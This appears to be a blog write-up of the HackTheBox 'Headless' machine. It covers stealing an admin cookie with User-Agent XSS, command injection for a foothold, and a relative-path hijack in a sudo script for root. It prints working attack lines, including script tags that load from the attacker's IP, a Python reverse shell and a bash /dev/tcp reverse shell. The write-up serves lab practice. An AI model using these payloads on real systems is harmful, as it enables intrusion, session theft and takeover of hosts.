---
layout: post
title: Headless - HackTheBox
categories:
- HackTheBox
tags:
- xss
- xss snake
- cookie hijack
- path hijack
- selenium
date: 2024-04-01
description: Headless its a easy hackthebox machine that is vulnerable to xss in a contact form. Using that vulnerability we can grab a cookie and gain admin access to the web app. Following that we detect a command injection which allows the foothold into the machine. Inside the machine we gain root by exploiting a script containing a path hijack vulnerability.
summary: Headless its a easy hackthebox machine that is vulnerable to xss in a contact form. Using that vulnerability we can grab a cookie and gain admin access to the web app. Following that we detect a command injection which allows the foothold into the machine. Inside the machine we gain root by exploiting a script containing a path hijack vulnerability.
cover:
  image: images/machine_img.png
---

## Recon

Running nmap it detects two open ports: 22(SSH) and 5000(http).

The port 5000 is running a python web app that uses a cookie `is_admin`, supposedly to verify if we are admin or not.
The main page tells that the website is being built and it has a link to another page which is a form to contact the support.
Lets run gobuster to see if it has some hidden pages.

`gobuster dir -u http://10.129.146.30:5000/ -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265] 


We detect another one `/dashboard` that seems to need more privileges.

## Foothold

Lets fuzz the parameters of the support form at the support page `/support` and see if we have some sort of XSS to get an admin cookie.
We can assume we can steal the cookie because of the `httponly` property is false.

```
POST /support HTTP/1.1
Host: 10.129.146.30:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.146.30:5000/support
Content-Type: application/x-www-form-urlencoded
Content-Length: 349
Origin: http://10.129.146.30:5000
DNT: 1
Connection: close
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1

fname=<script+src%3d"http%3a//10.10.14.46%3a8000/first_name"></script>&lname=<script+src%3d"http%3a//10.10.14.46%3a8000/last_name"></script>&email=<script+src%3d"http%3a//10.10.14.46%3a8000/email"></script>&phone=<script+src%3d"http%3a//10.10.14.46%3a8000/phone_number"></script>&message=<script+src%3d"http%3a//10.10.14.46%3a8000/message"></script>
```

After a couple of attempts we get the following error:

```html
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Wed, 27 Mar 2024 11:24:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2335
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacking Attempt Detected</title>
</head>
<body>
    <div class="container">
        <h1>Hacking Attempt Detected</h1>
        <p>Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.</p>
        <p><strong>Client Request Information:</strong></p>
        <pre><strong>Method:</strong> POST<br><strong>URL:</strong> http://10.129.146.30:5000/support<br><strong>Headers:</strong> <strong>Host:</strong> 10.129.146.30:5000<br><strong>User-Agent:</strong> Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0<br><strong>Accept:</strong> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><strong>Accept-Language:</strong> en-US,en;q=0.5<br><strong>Accept-Encoding:</strong> gzip, deflate, br<br><strong>Referer:</strong> http://10.129.146.30:5000/support<br><strong>Content-Type:</strong> application/x-www-form-urlencoded<br><strong>Content-Length:</strong> 349<br><strong>Origin:</strong> http://10.129.146.30:5000<br><strong>Dnt:</strong> 1<br><strong>Connection:</strong> close<br><strong>Cookie:</strong> is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs<br><strong>Upgrade-Insecure-Requests:</strong> 1<br><br></pre>
    </div>
</body>
</html>


```

From all the client information that will be viewed by the administrator and that we can control the **user-agent** is the most likely to be a target. 
Lets setup a xss in the user-agent.

Example: `User-Agent: <script src="http://10.10.14.46:8000/user_agent"></script>`, by opening a python server, `python3 -m http.server`, and wait a couple of minutes we get a connection trying to get our `user_agent` script. That means that our **reflected XSS worked**! 

Note: We can also use netcat to get the http connection: `nc -lvnp 8000`.

To get the cookie we used XSS wordlist called **XSS Snake**, link [here](https://gist.github.com/w0r7h/13ee74de3de2c89823b16353c1f84d85).
Replacing the ip of the wordlist with mine, with the command: `cat ./XSS_SNAKE | sed 's/10.10.14.164/<YOUR_IP>:8000/g' > xss_snake_my` and executing ffuf with it, we finally get a cookie.

ffuf command: `ffuf -w xss_snake_my_ip_2:FUZZ -request form_request -request-proto http`
Cookie: `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0`

We now go to the dashboard and capture the request. After some testing seems like the web app is vulnerable to **command injection** after piping another command. Final payload:
```shell
date=2023-09-15 ; python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.46",1234));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' ;
```

We get a shell as the user dvir and the user flag!


## Privilege Escalation

Looking for the sudo permissions we get:

```shell
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

```

We can't edit the script: `-r-xr-xr-x 1 root root 768 Feb  2 16:11 /usr/bin/syscheck`
Lets take a look at the script syscheck:

```bash
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```

The script has a PATH hijack in the file `./initdb.sh`. It does not specify the absolute path.
We just need to create the file `initdb.sh` with a reverse shell: `bash -i >& /dev/tcp/10.10.14.128/1235 0>&1` and set it as executable: `chmod +x initdb.sh`

Open a netcat listener at port 1235 in my case and execute: `sudo /usr/bin/syscheck`

We get root!

## Other machine details

If we dive into the machine to try to understand the web app, it has a cronjob that uses selenium to access the hacking reports and its that, that we steal the cookie from.